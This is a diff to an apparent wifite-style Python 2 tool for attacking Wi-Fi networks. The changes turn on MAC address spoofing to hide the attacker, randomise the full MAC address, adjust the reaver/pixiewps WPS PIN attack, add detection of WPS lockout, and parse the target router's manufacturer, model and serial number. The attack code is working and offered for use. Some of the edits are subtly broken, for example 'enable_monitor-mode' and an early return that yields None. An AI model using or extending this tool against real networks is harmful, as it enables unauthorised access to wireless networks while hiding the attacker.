@@ -88,7 +88,7 @@ from subprocess import call
 # GLOBAL VARIABLES IN ALL CAPS #
 ################################
 
-REVISION = 106
+REVISION = 107
 
 
 # WPA variables
@@ -1031,13 +1031,13 @@ def get_iface():
 		print R+' [!]'+O+" you need to plug in a wifi device or install drivers.\n"+W
 		exit_gracefully(0)
 	elif WIRELESS_IFACE != '' and monitors.count(WIRELESS_IFACE) > 0:
-		#mac_anonymize(monitor)
+		mac_anonymize(monitor)
 		return enable_monitor-mode
 
 	elif len(monitors) == 1:
 		monitor = monitors[0][:monitors[0].find('\t')]
 		print monitor
-		#mac_anonymize(monitor)
+		mac_anonymize(monitor)
 		
 		return enable_monitor_mode(monitor)
 	
@@ -1605,13 +1605,13 @@ def generate_random_mac(old_mac):
 		Keeps the same vender (first 6 chars) of the old MAC address (old_mac).
 		Returns string in format old_mac[0:9] + :XX:XX:XX where X is random hex
 	"""
+	if ORIGINAL_IFACE_MAC == old_mac:return
 	random.seed()
-	new_mac = old_mac[:8].lower().replace('-', ':')
-	for i in xrange(0, 6):
-		if i % 2 == 0: new_mac += ':'
+	new_mac = old_mac[:0].lower().replace('-', ':')
+	for i in xrange(0, 12):
+		if i % 2 == 0 and not i == 0: new_mac += ':'
 		new_mac += '0123456789abcdef'[random.randint(0,15)]
 	
-	# Prevent generating the same MAC address via recursion.
 	if new_mac == old_mac:
 		new_mac = generate_random_mac(old_mac)
 	return new_mac
@@ -1625,7 +1625,7 @@ def mac_anonymize(iface):
 	"""
 	global ORIGINAL_IFACE_MAC
 	if DO_NOT_CHANGE_MAC: return
-	if not program_exists('ifconfig'): return
+	if not program_exists('macchanger'): return
 	
 	# Store old (current) MAC address
 	proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN)
@@ -2947,11 +2947,12 @@ def wps_attack(iface, target):
 	AuthKeyb=""
 	ENonceb=""
 	hash_suc = 0
+	locked=""
 
 	p_out = open(temp + "reaver_out.out", "w")
 	#Run reaver to collect hashes
 	#Report when each hash is found
-	pid = Popen(["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vv", "-N", "-L", "-a", "-P" ], stdout=p_out).pid
+	pid = Popen(["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vv", "-N", "-a", "-P" ], stdout=p_out).pid
 	p = open(temp + "reaver_out.out")    
 	try:
 		while pixie_exit == False:
@@ -2959,12 +2960,17 @@ def wps_attack(iface, target):
 				time.sleep(1)
 
 				pixieprog=time.time()-p_start
-				print ' %s Waiting...' % \
+				print ' %s Waiting for hashes' % \
 					(W+sec_to_hms(pixieprog)),
 				print '\r',
 				stdout.flush()
 
 				line = p.readline()
+				if "Detected AP rate limiting" in line and locked == "":                                                                                                     
+					print GR+' [+]'+G+' WPS LOCKED!            '                                                                                         
+					locked="1"
+					#Ask what to do here
+
 				if "E-Nonce:" in line and ENonceb == "":                                                                                                     
 					print GR+' [+]'+G+' E-Nonce found            '                                                                                         
 					ENonceb="1"
@@ -2974,14 +2980,14 @@ def wps_attack(iface, target):
 					print GR+' [+]'+G+' PKE hash found            '
 					PKEb="1"
 					p_run=p_run+PIXIE_ADD_TO                                    
-					hash_suc = hash_suc + 1
-                                if "WPS Manufacturer" in line:                                   
+					hash_suc = hash_suc + 1                                       
+                                if "WPS Manufacturer" in line and mfr == "":                                   
                                         mfr=line[line.find("Manufacturer:")+14:line.find("\n")] 
 					print GR+' [+]'+G+' Manufacturer: '+W+' %s ' % (mfr)    
-                                if "WPS Model Number" in line:                                      
+                                if "WPS Model Number" in line and model == "":                                      
                                         model=line[line.find("Model Number:")+14:line.find("\n")]
 					print GR+' [+]'+G+' Model: '+W+' %s ' % (model)   
-                                if "WPS Model Serial Number" in line:                               
+                                if "WPS Model Serial Number" in line and serial == "":                               
                                         serial=line[line.find("Serial Number:")+15:line.find("\n")]
 					print GR+' [+]'+G+' Serial: '+W+' %s ' % (serial)
        			        if "PKR:" in line and PKRb == "":                 
@@ -3004,12 +3010,16 @@ def wps_attack(iface, target):
 					print GR+' [+]'+G+' E-Hash2 found            '
 					pixie = True
 					pixie_exit = True
+
 				if PIXIE_TIMEOUT > 0 and p_run < int(time.time()):
 					pcompleted=PIXIE_TIMEOUT + (PIXIE_ADD_TO * hash_suc)
 					print R+'\n [!]'+O+' unable to complete in %d seconds' % (pcompleted)
 					print R+' [+]'+W+' skipping pixiewps on %s' % (O+target.ssid+W)
 					WPSpin="WPS pin not found!"
-					pixie_exit=True	
+					pixie_exit=True
+					#hash recording	
+
+
 					break
 				stdout.flush()
 
@@ -3017,7 +3027,7 @@ def wps_attack(iface, target):
 		print R+'\n (^C)'+O+' Pixiewps attack interrupted'+W
 		if ENDLESS == 0:
 			if len(CRACKED_TARGETS) == 0:
-				print R+' [!]'+O+' there are not cracked access points saved to '+R+'cracked.txt\n'+W
+				print R+' [!]'+O+' there are no cracked access points'+W
 				exit_gracefully(1)
 			print GR+' [+]'+W+' '+W+'previously cracked access points'+W+':'
 			for victim in CRACKED_TARGETS:
